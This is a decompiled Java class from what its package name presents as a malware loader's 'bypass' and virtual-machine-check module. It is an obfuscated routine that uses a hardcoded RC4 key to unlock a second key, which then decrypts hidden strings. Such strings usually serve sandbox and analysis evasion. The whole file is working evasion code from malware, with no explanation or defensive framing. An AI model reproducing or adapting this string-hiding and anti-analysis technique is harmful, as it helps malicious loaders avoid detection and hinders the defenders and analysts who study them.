package bypass.loader.check;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import sun.misc.BASE64Decoder;

public class VirtualMachineCheckStrings {
   public static String G = "ARCFOUR";
   public static String H = "jD7e4x99jnJFYWPX";
   private static final long a = 105144493943124L;

   public static String g(String var0) {
      String var4 = "kkHBHcY3ZSiczPqdmPftdw==";

      String var3;
      try {
         Cipher var5 = Cipher.getInstance(G);
         SecretKeySpec var6 = new SecretKeySpec(H.getBytes(), G);
         var5.init(2, var6);
         byte[] var7 = new BASE64Decoder().decodeBuffer(var4);
         byte[] var8 = var5.doFinal(var7);
         SecretKeySpec var9 = new SecretKeySpec(var8, G);
         var5.init(2, var9);
         byte[] var10 = new BASE64Decoder().decodeBuffer(var0);
         byte[] var11 = var5.doFinal(var10);
         var3 = new String(var11);
      } catch (Exception var12) {
         var3 = "";
      }

      return var3;
   }
}
